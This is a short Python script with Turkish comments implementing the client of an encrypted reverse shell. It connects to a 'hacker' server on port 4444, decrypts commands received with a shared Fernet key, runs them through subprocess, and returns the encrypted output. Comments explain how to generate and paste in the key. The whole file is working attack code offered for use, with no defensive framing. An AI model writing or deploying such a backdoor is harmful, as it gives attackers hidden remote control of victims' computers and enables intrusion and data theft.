import socket
import subprocess
from cryptography.fernet import Fernet

# Hacker (Server) IP ve Port
HOST = '127.0.0.1' 
PORT = 4444

# Şifreleme Anahtarı (Hem Client hem Server'da aynı olmalı)
key = b'88J7sC18I9w...kendi_keyini_üret...' # Fernet.generate_key() ile üret

def start_shell():
    s = socket.socket()
    print(f"Bağlantı aranıyor... {HOST}:{PORT}")
    
    try:
        s.connect((HOST, PORT))
        cipher = Fernet(key)
        
        while True:
            # Şifreli komutu al ve çöz
            encrypted_command = s.recv(1024)
            command = cipher.decrypt(encrypted_command).decode()
            
            if command.lower() == 'exit':
                break
            
            # Komutu çalıştır
            output = subprocess.getoutput(command)
            
            # Sonucu şifrele ve geri gönder
            encrypted_output = cipher.encrypt(output.encode())
            s.send(encrypted_output)
            
        s.close()
    except Exception as e:
        print(f"Hata: {e}")

# Not: Bu kodu çalıştırmadan önce 'Generate Key' yapıp key'i buraya yapıştırmalısın.
# print(Fernet.generate_key())
# start_shell()